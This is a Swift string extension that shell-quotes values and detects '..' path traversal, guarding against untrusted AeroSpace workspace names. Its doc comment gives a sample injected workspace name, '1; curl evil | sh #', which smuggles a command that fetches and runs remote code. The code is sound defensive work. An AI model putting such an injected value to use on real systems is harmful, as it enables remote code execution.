import Foundation

public extension String {
    /// This string as a single, literal `/bin/sh` argument.
    ///
    /// Values that reach a shell command are not all config-authored. An
    /// AeroSpace workspace name arrives over `aerospace subscribe` and is
    /// whatever created it chose, so interpolating one into
    /// `aerospace workspace \(name)` lets a workspace called
    /// `1; curl evil | sh #` run on the next click.
    ///
    /// Single quotes disable every shell metacharacter; the only character
    /// needing care is the quote itself, closed and re-opened around an
    /// escaped one.
    var shellQuoted: String {
        "'" + replacingOccurrences(of: "'", with: "'\\''") + "'"
    }

    /// True when this path escapes upward through a `..` component.
    ///
    /// Image paths may interpolate provider values, so the same untrusted
    /// workspace name can reach a filesystem path.
    var containsUpwardTraversal: Bool {
        (self as NSString).pathComponents.contains("..")
    }
}
